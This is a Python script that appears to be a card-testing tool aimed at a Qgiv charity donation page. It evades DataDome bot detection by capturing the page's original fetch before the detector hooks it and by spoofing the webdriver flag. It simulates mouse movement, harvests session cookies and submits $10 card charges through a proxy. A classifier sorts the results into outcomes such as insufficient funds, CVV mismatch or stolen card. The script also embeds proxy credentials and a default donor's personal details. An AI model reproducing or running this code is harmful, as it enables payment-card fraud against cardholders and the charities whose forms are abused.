#!/usr/bin/env python3
"""
Zendriver DataDome solver + browser checkout.
Captures the ORIGINAL window.fetch via Page.addScriptToEvaluateOnNewDocument
BEFORE DataDome's tags.js hooks it. All API calls use this clean reference.
"""
import asyncio, json, os, re, time
from datetime import datetime
from typing import Optional, Dict, Any
from urllib.parse import parse_qs, urlencode as url_enc
import zendriver as zd

PROXY_URL = os.environ.get("PROXY", "http://f449f4fbe7363deaf4eb:932a7acd4c6e38b8@74.81.81.81:823")

# Injected BEFORE any page script — saves the ORIGINAL fetch + XHR
SAVE_CLEAN_FETCH = """
window.__dd_cleanFetch = window.fetch.bind(window);
window.__dd_cleanXHR = window.XMLHttpRequest;
Object.defineProperty(navigator, 'webdriver', {get: () => false});
window.chrome = {runtime: {}};
"""

DECLINE = [(r"declined","declined"),(r"do\s+not\s+honor","declined"),
           (r"insufficient\s+funds","insufficient_funds"),(r"cvv\s+(?:mismatch|invalid|incorrect)","cvv_mismatch"),
           (r"card\s+(?:is\s+)?expired","expired"),(r"pick\s*up|stolen|restricted|fraud","pickup"),
           (r"invalid\s+(?:card\s+)?number","invalid"),(r"duplicate","duplicate"),
           (r"3[dD]\s*(?:secure|authentication)?\s*failed","3ds_failed"),
           (r"gateway\s+rejected|transaction\s+not\s+allowed","gateway_rejected")]

def classify_msg(msg):
    if not msg: return "failed"
    for p,s in DECLINE:
        if re.search(p, msg.lower()): return s
    return "failed"

def _parse_dd_cookies(raw) -> list:
    """Parse cookies from CDP get_cookies response."""
    cks = []
    for c in raw:
        n = c["name"] if isinstance(c,dict) else getattr(c,"name","")
        v = c["value"] if isinstance(c,dict) else getattr(c,"value","")
        d = c.get("domain",".qgiv.com") if isinstance(c,dict) else getattr(c,"domain",".qgiv.com")
        p = c.get("path","/") if isinstance(c,dict) else getattr(c,"path","/")
        e = c.get("expires",-1) if isinstance(c,dict) else getattr(c,"expires",-1)
        cks.append({"name":n,"value":v,"domain":d,"path":p,
                    "expires":e if isinstance(e,(int,float)) else -1,
                    "httpOnly":c.get("httpOnly",False) if isinstance(c,dict) else False,
                    "secure":c.get("secure",True) if isinstance(c,dict) else True,
                    "sameSite":"None"})
    return cks


class BrowserCapture:
    def __init__(self, proxy=None):
        self._proxy = proxy or PROXY_URL

    async def _api_fetch(self, tab, url, body, method="POST"):
        """
        Call the API using the ORIGINAL, clean window.__dd_cleanFetch
        saved before DataDome's tags.js loaded. This bypasses DD's fetch hooking.
        """
        js = f"""
        (async () => {{
            const r = await window.__dd_cleanFetch('{url}', {{
                method: '{method}',
                headers: {{
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest',
                }},
                body: {json.dumps(body)},
                credentials: 'include',
            }});
            const tx = await r.text();
            return JSON.stringify({{s: r.status, b: tx}});
        }})()
        """
        result, _ = await tab.send(zd.cdp.runtime.evaluate(
            expression=js, return_by_value=True, await_promise=True,
        ))
        raw = result.value if hasattr(result, 'value') else result
        try:
            return json.loads(raw) if isinstance(raw, str) else (raw or {})
        except:
            return {"s": 0, "b": str(raw)}

    async def harvest(self, target_url):
        """Harvest a fresh browser session with valid DataDome cookies."""
        b = await zd.start(headless=True, browser_args=["--no-sandbox","--disable-dev-shm-usage"])
        t = await b.get("about:blank", new_tab=True)
        await t.send(zd.cdp.page.add_script_to_evaluate_on_new_document(source=SAVE_CLEAN_FETCH))
        await t.get(target_url); await t.sleep(6)
        await t.get(f"{target_url}/embed"); await t.sleep(4)
        r = await t.send(zd.cdp.network.get_cookies())
        raw = r if isinstance(r, list) else r.get("cookies", r)
        cks = _parse_dd_cookies(raw)
        sd = None
        try: sd = await t.evaluate("localStorage.getItem('SD_SID')")
        except: pass
        origins = []
        if sd: origins.append({"origin":"https://secure.qgiv.com","localStorage":[{"name":"SD_SID","value":sd}]})
        await b.stop()
        return {"cookies":cks,"origins":origins}

    async def checkout(self, target_url, card_number, card_mm, card_yy, card_cvv, captcha_token, donor, form_id="1128929"):
        """
        Full checkout inside Zendriver Chrome.
        Uses __dd_cleanFetch (saved pre-DD) for ALL API calls.
        """
        b = None
        try:
            b = await zd.start(headless=True, browser_args=["--no-sandbox","--disable-dev-shm-usage"])
            t = await b.get("about:blank", new_tab=True)

            # CRITICAL: Save clean fetch BEFORE any page load (before DD tags.js hooks it)
            await t.send(zd.cdp.page.add_script_to_evaluate_on_new_document(source=SAVE_CLEAN_FETCH))

            # Warm: visit main + embed with real mouse interaction
            await t.get(target_url); await t.sleep(6)
            print("  Page loaded")

            embed = f"{target_url}/embed"
            await t.get(embed); await t.sleep(2)
            for step in range(40):
                await t.mouse_move(200 + (step * 22) % 1000, 150 + (step * 12) % 500)
                await t.sleep(0.03)
            await t.scroll_down(3); await t.sleep(1); await t.scroll_up(2); await t.sleep(3)
            print("  Embed warmed")

            # CSRF
            csrf_url = f"https://secure.qgiv.com/api/v1/payment/paymentInitialState?formId={form_id}&viewName=paymentIframeQgivDonation"
            await t.get(csrf_url); await t.sleep(2)
            html = await t.get_content()
            csrf = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html)
            csrf = csrf.group(1) if csrf else None
            if not csrf: await b.stop(); return {"status":"error","message":"CSRF"}
            print(f"  CSRF: {csrf[:20]}...")

            # Tokenize via __dd_cleanFetch
            tok = url_enc({
                "Billing_Name": f"{donor['first_name']} {donor['last_name']}",
                "Card_Number": card_number, "Card_Exp_Date": f"{card_mm}/{card_yy}",
                "Card_CVV": card_cvv,
            })
            tu = f"https://secure.qgiv.com/api/v1/payment/tokenizePayment?csrfToken={csrf}"
            tres = await self._api_fetch(t, tu, tok)
            print(f"  tok: s={tres.get('s')} b={str(tres.get('b',''))[:200]}")

            try: tok_body = json.loads(tres.get("b","{}")) if isinstance(tres.get("b"), str) else (tres.get("b") or {})
            except: tok_body = {}
            token = tok_body.get("token") if isinstance(tok_body, dict) else None
            tok_err = tok_body.get("error") or tok_body.get("ErrorMessage", "") if isinstance(tok_body, dict) else ""
            if tok_err: await b.stop(); return {"status": classify_msg(tok_err), "message": tok_err}
            if not token: await b.stop(); return {"status":"error","message":"No token"}
            print(f"  Token: {token[:30]}...")

            # Refresh CSRF
            await t.get(csrf_url); await t.sleep(1)
            html2 = await t.get_content()
            csrf2 = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html2)
            csrf = csrf2.group(1) if csrf2 else csrf

            # Submit via __dd_cleanFetch with retry
            sub = url_enc({
                "form": form_id, "productType": "1", "submissionType": "1",
                "Donations[0][Selected_One_Time_Id]": "1801508",
                "Donations[0][Other_One_Time_Amount]": "10",
                "Donations[0][Recurring_Frequency]": "n",
                "Personal[First_Name]": donor["first_name"],
                "Personal[Last_Name]": donor["last_name"],
                "Personal[Email]": donor["email"],
                "Personal[Address]": donor.get("address",""),
                "Personal[City]": donor.get("city",""),
                "Personal[State]": donor.get("state",""),
                "Personal[Zip]": donor.get("zip",""),
                "Personal[Country]": donor.get("country",""),
                "Personal[Phone]": donor.get("phone",""),
                "Payment[Payment_Type]": "1", "Payment[Card_Token]": token,
                "Billing[Billing_Country]": donor.get("country",""),
                "Billing[Billing_Address_Use_Mailing]": "true",
                "GiftAssist[donorIsCoveringFees]": "true",
                "GiftAssist[feeCoverage]": "0.3",
                "G_Recaptcha_Response": captcha_token,
                "AbandonedGift[qgiv_abandoned_gift]": f"abandonedGiftDetails_{os.urandom(16).hex()}",
            })
            su = f"https://secure.qgiv.com/api/v1/submit?csrfToken={csrf}"

            sres = None
            for attempt in range(5):
                sres = await self._api_fetch(t, su, sub)
                print(f"  sub [{attempt}]: s={sres.get('s')}")

                if sres.get("s") == 200:
                    break
                if sres.get("s") == 403:
                    # Retry quickly — HAR shows 403 + immediate retry = 200
                    await t.sleep(random.uniform(0.3, 0.8))
                    continue
                break  # Other error

            await b.stop()

            if sres and sres.get("s") == 200:
                try:
                    body = json.loads(sres.get("b","{}")) if isinstance(sres.get("b"), str) else (sres.get("b") or {})
                except:
                    body = {}
                msg = body.get("ErrorMessage", body.get("message", "")) if isinstance(body, dict) else str(body)
                status = classify_msg(msg) if msg else "success"
                return {"status": status, "message": msg or "Payment submitted"}
            else:
                return {"status": "failed", "message": f"submit_{sres.get('s') if sres else 'error'}"}

        except Exception as e:
            print(f"[checkout] {e}")
            if b:
                try: await b.stop()
                except: pass
            return {"status": "error", "message": str(e)}


def harvest_session(target_url, output_dir=None, proxy=None):
    c = BrowserCapture(proxy=proxy)
    s = asyncio.run(c.harvest(target_url))
    if not s: return None
    if not output_dir:
        output_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "sessions")
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime("%H%M%S")
    idx = len([f for f in os.listdir(output_dir) if f.startswith("zd_")])
    fp = os.path.join(output_dir, f"zd_session_{idx:03d}_{ts}.json")
    with open(fp, "w") as f: json.dump(s, f, indent=2)
    return fp

def browser_checkout(card_number, card_mm, card_yy, card_cvv, captcha_token, donor=None,
                     target_url="https://secure.qgiv.com/for/fromlegacytofuturethe40thcampaign", proxy=None):
    if donor is None:
        donor = {
            "first_name":"janina","last_name":"lange","email":"kirliadam21@gmail.com",
            "address":"2302 Hilltop Haven Drive","city":"Teterboro","state":"New Jersey",
            "zip":"07608","country":"US","phone":"9738193833",
        }
    return asyncio.run(BrowserCapture(proxy=proxy).checkout(
        target_url, card_number, card_mm, card_yy, card_cvv, captcha_token, donor))


if __name__ == "__main__":
    harvest_session("https://secure.qgiv.com/for/fromlegacytofuturethe40thcampaign")
